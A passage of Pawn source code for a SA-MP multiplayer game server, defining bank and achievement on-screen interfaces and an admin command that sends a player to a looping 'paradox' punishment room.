    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][12], 1);
    PlayerTextDrawSetSelectable(playerid, BankaTD[playerid][12], true);

    BankaTD[playerid][13] = CreatePlayerTextDraw(playerid, 137.500106, 277.111053, "Podigni Kredit");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][13], 0.235415, 1.148887);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][13], 391.000000, 20.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][13], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][13], -1061109505);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][13], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][13], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][13], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][13], 1);
    PlayerTextDrawSetSelectable(playerid, BankaTD[playerid][13], true);

    BankaTD[playerid][14] = CreatePlayerTextDraw(playerid, 137.500122, 306.666595, "Kredit");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][14], 0.235415, 1.148887);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][14], 391.000000, 20.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][14], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][14], -1061109505);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][14], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][14], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][14], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][14], 1);
    PlayerTextDrawSetSelectable(playerid, BankaTD[playerid][14], true);

    BankaTD[playerid][15] = CreatePlayerTextDraw(playerid, 515.833496, 106.777763, "ld_chat:thumbdn");
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][15], 14.000000, 13.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][15], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][15], -1);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][15], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][15], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][15], 4);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][15], 0);
    PlayerTextDrawSetSelectable(playerid, BankaTD[playerid][15], true);

    BankaTD[playerid][16] = CreatePlayerTextDraw(playerid, 255.000030, 143.851943, "box");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][16], 0.000000, 2.583333);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][16], 500.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][16], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][16], -1);
    PlayerTextDrawUseBox(playerid, BankaTD[playerid][16], 1);
    PlayerTextDrawBoxColor(playerid, BankaTD[playerid][16], 1246914047);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][16], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][16], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][16], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][16], 1);

    BankaTD[playerid][17] = CreatePlayerTextDraw(playerid, 261.250091, 149.037002, "Na racunu trenutno imas : ~r~12345678$");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][17], 0.235415, 1.148887);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][17], 649.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][17], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][17], -1061109505);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][17], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][17], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][17], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][17], 1);
    PlayerTextDrawSetSelectable(playerid, BankaTD[playerid][17], true);

    BankaTD[playerid][18] = CreatePlayerTextDraw(playerid, 327.083282, 192.074096, "Protected by");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][18], 0.400000, 1.600000);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][18], 733.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][18], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][18], -1061109505);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][18], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][18], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][18], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][18], 1);

    BankaTD[playerid][19] = CreatePlayerTextDraw(playerid, 255.416641, 188.962966, "box");
    PlayerTextDrawLetterSize(playerid, BankaTD[playerid][19], 0.000000, 15.416666);
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][19], 501.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][19], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][19], -1);
    PlayerTextDrawUseBox(playerid, BankaTD[playerid][19], 1);
    PlayerTextDrawBoxColor(playerid, BankaTD[playerid][19], 1246914047);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][19], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][19], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][19], 1);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][19], 1);

    BankaTD[playerid][20] = CreatePlayerTextDraw(playerid, 313.749969, 219.296386, "ld_drv:goboat");
    PlayerTextDrawTextSize(playerid, BankaTD[playerid][20], 113.000000, 103.000000);
    PlayerTextDrawAlignment(playerid, BankaTD[playerid][20], 1);
    PlayerTextDrawColor(playerid, BankaTD[playerid][20], -1);
    PlayerTextDrawSetShadow(playerid, BankaTD[playerid][20], 0);
    PlayerTextDrawBackgroundColor(playerid, BankaTD[playerid][20], 255);
    PlayerTextDrawFont(playerid, BankaTD[playerid][20], 4);
    PlayerTextDrawSetProportional(playerid, BankaTD[playerid][20], 0);

    return 1;
}

bankaTDControl(playerid, bool:show) {

    if(show) {

        bankaTDShown[playerid] = true;

        new stanje[128];

        if( PlayerInfo[ playerid ][ xImaBRacun ] == false ) {
            PlayerTextDrawSetString( playerid, BankaTD[playerid][17], "Ti nemas bankovni racun" );
        }
        else {
            format( stanje, sizeof( stanje ), "Na racunu trenutno imas : ~r~%d$", PlayerInfo[ playerid ][ xBRacun ] );
            PlayerTextDrawSetString( playerid, BankaTD[playerid][17], stanje );
        }

        for(new i = 0; i < 21; i++) {

            PlayerTextDrawShow(playerid, BankaTD[playerid][i]);
        }

        SelectTextDraw(playerid, SRVBOJA1);

        TogglePlayerControllable(playerid, false);

        return 1;
    }
    else {

        bankaTDShown[playerid] = false;

        for(new i = 0; i < 21; i++) {

            PlayerTextDrawHide(playerid, BankaTD[playerid][i]);
        }

        CancelSelectTextDraw(playerid);

        TogglePlayerControllable(playerid, true);

        return 1;
    }
}

CMD:banka(playerid) {

    if( !IsPlayerInRangeOfPoint( playerid, 2.0, BankaX, BankaY, BankaZ ) ) return SendErrorMessage( playerid, "Morate biti u banci kod pickupa." );

    if(bankaTDShown[playerid]) return bankaTDControl(playerid, false);
    else return bankaTDControl(playerid, true);
}

updateBankState(playerid) {

    new stanje[128];

    if( PlayerInfo[ playerid ][ xImaBRacun ] == false ) {
        PlayerTextDrawSetString( playerid, BankaTD[playerid][17], "Ti nemas bankovni racun" );
    }
    else {
        format( stanje, sizeof( stanje ), "Na racunu trenutno imas : ~r~%d$", PlayerInfo[ playerid ][ xBRacun ] );
        PlayerTextDrawSetString( playerid, BankaTD[playerid][17], stanje );
    }

    return 1;
}

forward syncanim(playerid);
public syncanim(playerid)
{
    if(GetPVarInt(playerid,"roped") == 0) return 0;
    SetTimerEx("syncanim",dur,0,"i",playerid);
    ApplyAnimation(playerid,"ped","abseil",4.0,0,0,0,1,0);
    return 1;
}

CMD:achivements(playerid) {

    new MisijeDialog[3000];
    strcat( MisijeDialog, ""SRVBOJA1SCM"__________________________Achivements__________________________\n\n");

    new string[128], done[32];

    if(PlayerInfo[playerid][xAchivements][0] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[0], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][1] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[1], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][2] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[2], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][3] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[3], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][4] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[4], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][5] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[5], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][6] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[6], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][7] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[7], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][8] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[8], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][9] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[9], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][10] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[10], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][11] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[11], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][12] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[12], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][13] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[13], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][14] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[14], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][15] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[15], done);
    strcat( MisijeDialog, string);

    if(PlayerInfo[playerid][xAchivements][16] == 0) done = "{fe0202}Aktivno";
    else done = "{00d904}Zavrseno"; 
    format(string, sizeof(string), ""SRVBOJA1SCM"%s\n    -> %s\n\n", AchivementList[16], done);
    strcat( MisijeDialog, string);

    SPD(playerid, 0, DIALOG_STYLE_MSGBOX, "Achivements", MisijeDialog, "Ok", "");

    return 1;
}

achivementsTDCreate(playerid) {

    AchivementsTD[playerid][0] = CreatePlayerTextDraw(playerid, 254.333389, 24.003709, "LD_SPAC:white");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][0], 137.000000, -20.000000);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][0], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][0], 673986047);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][0], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][0], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][0], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][0], 0);

    AchivementsTD[playerid][1] = CreatePlayerTextDraw(playerid, 245.233352, -0.840731, "ld_beat:chit");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][1], 19.000000, 29.560012);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][1], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][1], 673986047);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][1], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][1], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][1], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][1], 0);

    AchivementsTD[playerid][2] = CreatePlayerTextDraw(playerid, 381.466766, -0.955545, "ld_beat:chit");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][2], 19.000000, 29.560012);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][2], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][2], 673986047);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][2], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][2], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][2], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][2], 0);

    AchivementsTD[playerid][3] = CreatePlayerTextDraw(playerid, 246.600082, 1.288900, "ld_beat:chit");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][3], 21.000000, 25.000000);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][3], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][3], 255);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][3], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][3], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][3], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][3], 0);

    AchivementsTD[playerid][4] = CreatePlayerTextDraw(playerid, 328.666992, 12.814817, "Odradi_uspesnu_prodaju_droge_Favellamaaaaaa");
    PlayerTextDrawLetterSize(playerid, AchivementsTD[playerid][4], 0.112666, 0.612739);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][4], 2);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][4], -1);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][4], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][4], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][4], 2);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][4], 1);

    AchivementsTD[playerid][5] = CreatePlayerTextDraw(playerid, 247.500137, 2.488899, "ld_beat:chit");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][5], 19.049955, 22.479942);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][5], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][5], 1230140415);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][5], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][5], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][5], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][5], 0);

    AchivementsTD[playerid][6] = CreatePlayerTextDraw(playerid, 256.200042, 5.996284, "LD_SPAC:white");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][6], 1.679999, 15.260027);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][6], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][6], 255);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][6], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][6], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][6], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][6], 0);

    AchivementsTD[playerid][7] = CreatePlayerTextDraw(playerid, 250.133438, 12.718510, "LD_SPAC:white");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][7], 13.559988, 2.000000);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][7], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][7], 255);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][7], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][7], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][7], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][7], 0);

    AchivementsTD[playerid][8] = CreatePlayerTextDraw(playerid, 249.633377, 4.792603, "ld_beat:chit");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][8], 15.000000, 17.729993);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][8], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][8], 255);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][8], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][8], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][8], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][8], 0);

    AchivementsTD[playerid][9] = CreatePlayerTextDraw(playerid, 254.499923, 16.037042, "LD_SPAC:white");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][9], 5.000000, 1.000000);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][9], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][9], 1230140415);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][9], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][9], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][9], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][9], 0);

    AchivementsTD[playerid][10] = CreatePlayerTextDraw(playerid, 256.099975, 13.607391, "LD_SPAC:white");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][10], 1.639999, 3.000000);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][10], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][10], 1230140415);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][10], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][10], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][10], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][10], 0);

    AchivementsTD[playerid][11] = CreatePlayerTextDraw(playerid, 254.733337, 9.874055, "LD_SPAC:white");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][11], 4.909996, 4.400009);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][11], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][11], 1230140415);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][11], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][11], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][11], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][11], 0);

    AchivementsTD[playerid][12] = CreatePlayerTextDraw(playerid, 254.200088, 11.118498, "ld_beat:chit");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][12], 4.000000, 5.000000);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][12], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][12], 1230140415);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][12], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][12], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][12], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][12], 0);

    AchivementsTD[playerid][13] = CreatePlayerTextDraw(playerid, 256.100189, 11.118498, "ld_beat:chit");
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][13], 4.000000, 5.000000);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][13], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][13], 1230140415);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][13], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][13], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][13], 4);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][13], 0);

    AchivementsTD[playerid][14] = CreatePlayerTextDraw(playerid, 257.833282, 8.755552, "0");
    PlayerTextDrawLetterSize(playerid, AchivementsTD[playerid][14], 0.143665, 0.674961);
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][14], -36.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][14], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][14], 1230140415);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][14], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][14], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][14], 2);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][14], 1);

    AchivementsTD[playerid][15] = CreatePlayerTextDraw(playerid, 253.533020, 8.755552, "0");
    PlayerTextDrawLetterSize(playerid, AchivementsTD[playerid][15], 0.143665, 0.674961);
    PlayerTextDrawTextSize(playerid, AchivementsTD[playerid][15], -36.000000, 0.000000);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][15], 1);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][15], 1230140415);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][15], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][15], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][15], 2);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][15], 1);

    AchivementsTD[playerid][16] = CreatePlayerTextDraw(playerid, 324.600433, 4.577774, "Achivement_Unlocked");
    PlayerTextDrawLetterSize(playerid, AchivementsTD[playerid][16], 0.150665, 0.749629);
    PlayerTextDrawAlignment(playerid, AchivementsTD[playerid][16], 2);
    PlayerTextDrawColor(playerid, AchivementsTD[playerid][16], 1230140415);
    PlayerTextDrawSetShadow(playerid, AchivementsTD[playerid][16], 0);
    PlayerTextDrawBackgroundColor(playerid, AchivementsTD[playerid][16], 255);
    PlayerTextDrawFont(playerid, AchivementsTD[playerid][16], 2);
    PlayerTextDrawSetProportional(playerid, AchivementsTD[playerid][16], 1);

    return 1;
}

achivementsTDShow(playerid, number) {

    PlayerTextDrawSetString(playerid, AchivementsTD[playerid][4], AchivementList[number]);

    for(new i = 0; i < 17; i++) {

        PlayerTextDrawShow(playerid, AchivementsTD[playerid][i]);
    }

    defer hideAchivements(playerid);

    return 1;
}

timer hideAchivements[8000](playerid) {

    for(new i = 0; i < 17; i++) {

        PlayerTextDrawHide(playerid, AchivementsTD[playerid][i]);
    }

    return 1;
}

achivementPassed(playerid, number, price) {

    achivementsTDShow(playerid, number);
    DajIgracuNovac(playerid, price);

    PlayerInfo[playerid][xAchivements][number] = 1;
    SavePlayer(playerid);

    return 1;
}

CMD:paradox(playerid, params[]) {

    if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Samo admini!");

    new id, razlog[32];
    if(sscanf(params, "us[32]", id, razlog)) return SendUsageMessage(playerid, "/paradox [ID] [razlog]");

    if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");

    if(PlayerInfo[id][xAdmin] > PlayerInfo[playerid][xAdmin]) return SendErrorMessage(playerid, "Ne mozes ubaciti admina veceg od sebe!");

    if(PlayerInfo[id][xParadox] == 1) return SendErrorMessage(playerid, "Igrac je vec u paradoxu!");

    createParadox(id);

    SendClientMessageEx( id, SVETLOCRVENA, "Admin vas je stavio u paradox! Razlog: %s", razlog );
    SendClientMessageEx( playerid, SVETLOCRVENA, "Postavili ste igraca %s u paradox! Razlog: %s", ImeIgraca( id ), razlog );

    format( globalstring, sizeof( globalstring ), "PARADOX | Admin je postavio igraca %s u paradox.", ImeIgraca( id ) );
    SCMA( NARACRVENA, globalstring );
    
    format( globalstring, sizeof( globalstring ), "PARADOX | Admin %s je postavio igraca %s u paradox.", ImeIgraca( playerid ), ImeIgraca( id ));
    AdminPoruka( NARACRVENA, globalstring );
    format( globalstring, sizeof( globalstring ), "PARADOX | Razlog: %s.", razlog );
    AdminPoruka( NARACRVENA, globalstring );

    return 1;
}

CMD:izvuciparadox(playerid, params[]) {

    if(PlayerInfo[playerid][xAdmin] < 2) return SendErrorMessage(playerid, "Samo admini 2+!");

    new id;
    if(sscanf(params, "u", id)) return SendUsageMessage(playerid, "/paradox [ID]");

    if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");

    if(PlayerInfo[id][xParadox] == 0) return SendErrorMessage(playerid, "Igrac nije u paradoxu!");

    izvuciParadox(id);

    SendInfoMessage(playerid, "Izvukao si igraca %s iz paradox!", ImeIgraca(id));
    SendInfoMessage(playerid, "Admin %s te je izvukao iz paradox!", ImeIgraca(playerid));

    return 1;
}

createParadox(playerid) {

    room[playerid] = CreateDynamicObject(14744,2496.1000976563,-1656,1043,0.0,0.0,90.0, playerid, -1, -1, 40.0, 40.0, -1, 0);
    ndfloor[playerid] = CreateDynamicObject(3943,2492.3000488281, -1661.3000488281, 1050.0999755859,0.0,0.0,90.0, playerid, -1, -1, 40.0, 40.0, -1, 0);
    stfloor[playerid] = CreateDynamicObject(3943,2495.6000976563,-1657.4000244141,1045.6999511719,0.0,0.0,0.0, playerid, -1, -1, 40.0, 40.0, -1, 0);

    GameTextForPlayer( playerid, "Ucitavanje ...", 1000, 4 );
    SetTimerEx( "SlobodnoSada", 4000, false, "i", playerid );

    ResetAllWeapons(playerid);

    TogglePlayerControllable(playerid, 0);

    SetPlayerVirtualWorld(playerid, playerid);
    Novi_SetPlayerPos(playerid,2496.1000976563,-1656,1044);
    SetPlayerFacingAngle(playerid,90.0);

    PlayerInfo[playerid][xParadox] = 1;
    SavePlayer(playerid);

    return 1;
}

izvuciParadox(playerid) {

    DestroyDynamicObject(room[playerid]);
    DestroyDynamicObject(ndfloor[playerid]);
    DestroyDynamicObject(stfloor[playerid]);

    SetPlayerVirtualWorld(playerid, 0);

    PlayerInfo[playerid][xParadox] = 0;
    SavePlayer(playerid);

    Novi_SetPlayerHealth(playerid, 0);

    return 1;
}

ptask Paradox[200](playerid) {

    if(PlayerInfo[playerid][xParadox] == 1) {

        new Float:oX,Float:oY,Float:oZ,Float:X,Float:Y,Float:Z;
        GetDynamicObjectPos(room[playerid], oX, oY, oZ);
        GetPlayerPos(playerid, X, Y, Z);
        if(Z > oZ+5.0817)
        {
            if(turn[playerid] == 0)
            {
                DestroyDynamicObject(stfloor[playerid]);
                stfloor[playerid] = ndfloor[playerid];
                GetDynamicObjectPos(stfloor[playerid], oX, oY, oZ);
                SetDynamicObjectPos(room[playerid], oX-1.41, oY+0.5, oZ-2.6999511719);
                GetDynamicObjectRot(room[playerid], oX, oY, oZ);
                SetDynamicObjectRot(room[playerid], 0.0, 0.0, oZ+90.0);
                GetDynamicObjectPos(stfloor[playerid], oX, oY, oZ);
                GetDynamicObjectRot(stfloor[playerid], X, Y, Z);
                ndfloor[playerid] = CreateDynamicObject(3943, oX+3.7, oY-3.3, oZ+4.400024414, 0.0, 0.0, Z+90.0, playerid, -1, -1, 40.0, 40.0, -1, 0);
            }
            else if(turn[playerid] == 1)
            {
                DestroyDynamicObject(stfloor[playerid]);
                stfloor[playerid] = ndfloor[playerid];
                GetDynamicObjectPos(stfloor[playerid], oX, oY, oZ);
                SetDynamicObjectPos(room[playerid], oX-0.5, oY-1.4, oZ-2.6999511719);
                GetDynamicObjectRot(room[playerid], oX, oY, oZ);
                SetDynamicObjectRot(room[playerid], 0.0, 0.0, oZ+90.0);
                GetDynamicObjectPos(stfloor[playerid], oX, oY, oZ);
                GetDynamicObjectRot(stfloor[playerid], X, Y, Z);
                ndfloor[playerid] = CreateDynamicObject(3943, oX+3.3, oY+3.9, oZ+4.400024414, 0.0, 0.0, Z+90.0, playerid, -1, -1, 40.0, 40.0, -1, 0);
            }
